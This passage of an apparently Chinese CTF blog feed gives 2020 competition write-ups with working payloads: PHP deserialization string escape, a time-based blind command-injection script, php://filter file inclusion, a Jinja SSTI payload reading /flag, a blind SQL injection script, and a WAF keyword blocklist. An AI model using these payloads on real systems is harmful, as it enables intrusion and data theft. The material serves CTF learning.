class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>password<span class="string">";O:1:"</span>B<span class="string">":1:&#123;s:1:"</span>b<span class="string">";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>这里write()中将<code>&#39;chr(0) . &#39;*&#39; . chr(0)&#39;</code>替换为<code>&#39;\0\0\0&#39;</code>,长度由3变成6，增加三个字符，read()中<code>&#39;\0\0\0&#39;</code>替换为<code>chr(0) . &#39;*&#39; . chr(0)</code>，长度由6变成3，减少3个字符。 先write()操作后read()，这里只能用字符缩短的逃匿方法。  </p><p>正常序列化的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><p>其中要利用username吃掉后面的<code>&quot;;s:8:&quot;password&quot;;s:xx:&quot;</code>,为23个字符。<br>可以用6个\0\0\0,可以减少24个字符，多减少了一个字符，在实际上要添加的字符串可以在多填上一个字符即可。</p><p>此时payload为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=a<span class="string">";s:8:"</span>password<span class="string">";O:1:"</span>B<span class="string">":1:&#123;s:1:"</span>b<span class="string">";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/php/serialize/3.png" alt=""><br><img src="../../images/php/serialize/4.png" alt=""></p><p>参考文章：<br><a href="https://www.moonback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">PHP反序列化字符逃逸</a><br><a href="http://www.bealright.top/2020/08/24/%E6%B5%85%E6%9E%90php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">浅析php反序列化字符串逃逸</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP 反序列化逃匿学习小记&lt;br&gt;详情可看此篇文章: &lt;a href=&quot;https://www.moonback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP反序列化字符逃逸&lt;/a&gt;  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020年比赛题目集合</title>
    <link href="https://blog.cfyqy.com/article/77cfb00d.html"/>
    <id>https://blog.cfyqy.com/article/77cfb00d.html</id>
    <published>2020-09-14T12:56:50.000Z</published>
    <updated>2021-01-05T03:11:19.012Z</updated>
    
    <content type="html"><![CDATA[<p>2020的一些题目集合</p><a id="more"></a><h1 id="钓鱼杯"><a href="#钓鱼杯" class="headerlink" title="钓鱼杯"></a>钓鱼杯</h1><h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h2><p><img src="../../images/game/2020/fish/1.jpg" alt=""><br>注意 PHP 版本<br><img src="../../images/game/2020/fish/2.jpg" alt=""></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>cut 和sleep<br><img src="../../images/game/2020/fish/3.jpg" alt=""><br>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch=curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">'http://119.3.37.185/'</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">$flag=<span class="string">'flag&#123;'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">6</span>;$i&lt;<span class="number">64</span>;$i++)&#123;</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">32</span>;$j&lt;=<span class="number">127</span>;$j++)&#123;</span><br><span class="line">$c=chr($j);</span><br><span class="line">$data=<span class="keyword">array</span>(<span class="string">'cmd'</span> =&gt; <span class="string">"a=`cut -b $i /flag*`;[ \$a = \"$c\" ] &amp;&amp; sleep 1"</span> );</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">$t1=microtime(<span class="keyword">true</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">$t=microtime(<span class="keyword">true</span>)-$t1;</span><br><span class="line"><span class="keyword">if</span>($t&gt;<span class="number">1</span>)&#123;</span><br><span class="line">$flag.=$c;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$flag\n"</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">"http://119.3.37.185/"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data=<span class="string">"a=`cut -b &#123;&#125; /flag*`;[ $a = \"&#123;&#125;\" ] &amp;&amp; sleep 1"</span>.format(i,chr(j))</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        requests.post(url=url,data=&#123;<span class="string">"cmd"</span>:data&#125;)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        spend_time = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;<span class="number">1</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h1 id="楚慧杯"><a href="#楚慧杯" class="headerlink" title="楚慧杯"></a>楚慧杯</h1><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p><img src="../../images/game/2020/chb/1.png" alt=""></p><h2 id="被遗弃的-waf"><a href="#被遗弃的-waf" class="headerlink" title="被遗弃的 waf"></a>被遗弃的 waf</h2><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter</a>    </p><p>如下请求分别得到index.php和waf.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://198.13.53.87:8002/?file=php://filter/convert.iconv.utf-8.utf-16/resource=waf.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$Waf = <span class="keyword">new</span> Wafs;</span><br><span class="line">$get = $Waf-&gt;waf($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">include</span> ($get);</span><br><span class="line">$help_arr = [<span class="string">'hello'</span> =&gt; <span class="string">'zhangsan'</span>, <span class="string">'waf'</span> =&gt; $_GET[<span class="string">'a'</span>], <span class="string">'goodthing'</span> =&gt; <span class="string">'no'</span>];</span><br><span class="line">$help_ser = serialize($help_arr);</span><br><span class="line">$help_flag = unserialize($Waf-&gt;waf($help_ser, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">if</span> ($help_flag[<span class="string">'goodthing'</span>] === <span class="string">'yes'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wafs</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($things, $all = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">        $waf_1 = <span class="string">"/base|encode|print|zlib|quoted|write|rot13|read|flag|string/i"</span>;</span><br><span class="line">        $waf_2 = <span class="string">"/flag|eval|system|cat|whoami|flags/i"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($all == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match($waf_1, $things)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">' N��\Ջ;e4xb�vwaf&lt;�br&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($waf_2, <span class="string">'hacker'</span>, $things);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>无过滤，考SSTI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze91js64coesine03jt.cloudeci1.ichunqiu.com:8888/loged?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__==%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].open(%27/flag%27,%27r%27).<span class="built_in">read</span>()%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure><h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>登陆框 password 存在布尔盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">  result = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    result += hex(ord(i))</span><br><span class="line">  result = result.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'0x'</span>+result</span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">r'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;_-'</span>]</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://eci-2ze7qhojurw0cqotdnjs.cloudeci1.ichunqiu.com/index.php"</span></span><br><span class="line">attack = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">attack = flag+chr(j)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'\\'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'or password regexp binary %s#'</span>%(ord2hex(<span class="string">'^'</span>+attack))</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"用户名或密码错"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">flag=flag+chr(j)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到flag  </p><h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='upload.php'&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $uploader=<span class="keyword">new</span> Upload();</span><br><span class="line">        $uploader-&gt;upload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $reader=<span class="keyword">new</span> reader();</span><br><span class="line">        $reader-&gt;read($_POST[<span class="string">'filename'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"p3rh4ps"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"p3rh4ps"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"p3rh4ps"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql=<span class="string">"select id,password from users where username=?"</span>;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;black_list = [<span class="string">'ph'</span>, <span class="string">'ht'</span>, <span class="string">'sh'</span>, <span class="string">'pe'</span>, <span class="string">'j'</span>, <span class="string">'='</span>, <span class="string">'co'</span>, <span class="string">'\\'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext = substr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>], strpos($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>], <span class="string">'.'</span>));</span><br><span class="line">        $reg=implode(<span class="string">"|"</span>,<span class="keyword">$this</span>-&gt;black_list);</span><br><span class="line">        $reg = <span class="string">"/"</span> . $reg . <span class="string">"\x|\s|[\x01-\x20]/i"</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match($reg, $ext))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $ext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $_FILES[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">10240</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">"too big"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            $new_addr = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>] . <span class="string">"/upload/"</span> . md5($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]) . <span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">                            <span class="keyword">echo</span> $new_addr;</span><br><span class="line">                            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $new_addr);</span><br><span class="line">                            <span class="keyword">return</span> $new_addr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Noooooooooooooooooooooooooooo!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $result;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"想多了嗷"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/sh/i"</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span 